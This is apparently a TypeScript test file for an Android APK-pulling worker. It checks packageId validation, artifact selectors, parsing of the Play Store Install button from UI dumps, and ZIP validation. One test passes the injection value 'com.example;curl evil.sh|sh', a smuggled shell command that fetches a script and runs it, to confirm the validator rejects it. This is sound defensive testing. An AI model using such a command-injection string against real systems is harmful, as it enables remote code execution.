import { describe, it } from 'node:test';
import assert from 'node:assert';
import path from 'path';
import fs from 'fs/promises';
import { existsSync } from 'fs';
import { getInstalledPaths } from './android/adb.js';
import { triggerPlayStoreInstall, getEstimatedInstallCoordinates, findInstallButton } from './pipeline/installer.js';
import { validateZipArchive } from './pipeline/puller.js';
import { isApkPath, selectorFor, selectorMatches } from '@app-relay/contracts';

describe('Worker Unit & Pipeline Tests', () => {
  it('verifies default worker configuration defaults', () => {
    const workerName = process.env.WORKER_NAME || 'test-worker';
    assert.ok(workerName.length > 0);
  });

  it('validates WORKER_TOKEN presence requirement', () => {
    const checkToken = (val?: string) => {
      if (!val) throw new Error('WORKER_TOKEN environment variable is required');
    };
    assert.throws(() => checkToken(undefined), /WORKER_TOKEN environment variable is required/);
    assert.doesNotThrow(() => checkToken('valid_worker_token'));
  });

  describe('getInstalledPaths validation', () => {
    it('returns empty array when packageId contains invalid characters', async () => {
      const result = await getInstalledPaths('com.example;curl evil.sh|sh');
      assert.deepStrictEqual(result, []);
    });
  });

  describe('triggerPlayStoreInstall validation', () => {
    it('throws error when packageId contains injection attempt', async () => {
      await assert.rejects(
        () => triggerPlayStoreInstall('invalid;command', '/tmp'),
        /Invalid packageId format/
      );
    });
  });

  describe('artifact selectors', () => {
    it('phân loại đúng file APK và file listing', () => {
      assert.strictEqual(selectorFor('base.apk'), 'apk.base');
      assert.strictEqual(selectorFor('split_config.arm64_v8a.apk'), 'apk.splits');
      assert.strictEqual(selectorFor('split_config.xxhdpi.apk'), 'apk.splits');
      assert.strictEqual(selectorFor('playstore/screenshots/screenshot_01.png'), 'screenshots');
      assert.strictEqual(selectorFor('playstore/icon.png'), 'listing');
      assert.strictEqual(selectorFor('playstore/page.html'), 'listing.full');
      assert.strictEqual(selectorFor('PULL_MANIFEST.txt'), 'metadata');
    });

    it("'apk' gom cả base lẫn split, không dính file khác", () => {
      assert.ok(selectorMatches('base.apk', 'apk'));
      assert.ok(selectorMatches('split_config.arm64_v8a.apk', 'apk'));
      assert.ok(!selectorMatches('playstore/icon.png', 'apk'));
      assert.ok(!selectorMatches('package-info.txt', 'apk'));
    });

    it("'all' khớp mọi file", () => {
      for (const p of ['base.apk', 'playstore/icon.png', 'PULL_MANIFEST.txt']) {
        assert.ok(selectorMatches(p, 'all'));
      }
    });

    it('không nhầm file có tên gần giống split thành split', () => {
      // Đây là những cái tên sẽ lọt nếu dùng startsWith('split_config') thay vì regex.
      assert.ok(!selectorMatches('split_config.arm64_v8a.apk.bak', 'apk.splits'));
      assert.ok(!selectorMatches('playstore/split_config.x.apk', 'apk.splits'));
      assert.ok(!isApkPath('base.apk.txt'));
    });

    it('APK được nhận diện đúng để áp TTL riêng', () => {
      assert.ok(isApkPath('base.apk'));
      assert.ok(isApkPath('split_config.xxhdpi.apk'));
      assert.ok(!isApkPath('playstore/screenshots/screenshot_01.png'));
      assert.ok(!isApkPath('package-info.txt'));
    });
  });

  describe('estimated install coordinates calculation', () => {
    it('calculates screen relative coordinates', async () => {
      const coords = await getEstimatedInstallCoordinates();
      assert.ok(coords.x > 0);
      assert.ok(coords.y > 0);
    });
  });

  describe('findInstallButton — đọc nút Install từ cây UI', () => {
    it('lấy tâm nút khi text đứng trước bounds', () => {
      const xml = '<node text="Install" bounds="[100,200][500,300]" />';
      assert.deepStrictEqual(findInstallButton(xml), { x: 300, y: 250 });
    });

    it('lấy tâm nút khi bounds đứng trước text', () => {
      const xml = '<node bounds="[100,200][500,300]" text="Install" />';
      assert.deepStrictEqual(findInstallButton(xml), { x: 300, y: 250 });
    });

    it('đọc được nhãn tiếng Việt và content-desc', () => {
      assert.deepStrictEqual(
        findInstallButton('<node text="Cài đặt" bounds="[0,0][100,100]" />'),
        { x: 50, y: 50 }
      );
      assert.deepStrictEqual(
        findInstallButton('<node content-desc="Install" bounds="[10,10][30,30]" />'),
        { x: 20, y: 20 }
      );
    });

    it('trả null cho dump của hộp thoại ANR', () => {
      // Đây là thứ THẬT SỰ chụp được khi máy quá tải: hộp thoại "Application Not
      // Responding" nằm đè lên Play Store, package `android`, khoảng chục node,
      // không có nút Install nào. Bản cũ coi đây là "không khớp" rồi lặng lẽ bấm
      // theo toạ độ đoán — cú bấm rơi vào hộp thoại và không có gì được cài.
      const anrDump =
        '<?xml version="1.0" encoding="UTF-8"?><hierarchy rotation="0">' +
        '<node index="0" text="" package="android" bounds="[0,0][1080,2400]">' +
        '<node index="0" text="Digital Wellbeing isn\'t responding" package="android" bounds="[54,1000][1026,1100]" />' +
        '<node index="1" text="Close app" package="android" bounds="[54,1200][1026,1300]" />' +
        '<node index="2" text="Wait" package="android" bounds="[54,1320][1026,1420]" />' +
        '</node></hierarchy>';
      assert.strictEqual(findInstallButton(anrDump), null);
    });

    it('trả null khi dump rỗng hoặc không có nút nào', () => {
      assert.strictEqual(findInstallButton(''), null);
      assert.strictEqual(findInstallButton('<node text="Open" bounds="[0,0][10,10]" />'), null);
    });

    it('trả null khi bounds hỏng thay vì tính ra NaN', () => {
      assert.strictEqual(findInstallButton('<node text="Install" bounds="[a,b][c,d]" />'), null);
    });
  });

  describe('validateZipArchive validation', () => {
    it('rejects invalid non-ZIP files', async () => {
      const testFilePath = path.join(process.cwd(), 'work', 'invalid.apk');
      await fs.mkdir(path.dirname(testFilePath), { recursive: true });
      await fs.writeFile(testFilePath, 'not-a-zip-file');
      try {
        await assert.rejects(
          () => validateZipArchive(testFilePath),
          /Validation failed/
        );
      } finally {
        await fs.rm(testFilePath, { force: true }).catch(() => {});
      }
    });
  });
});
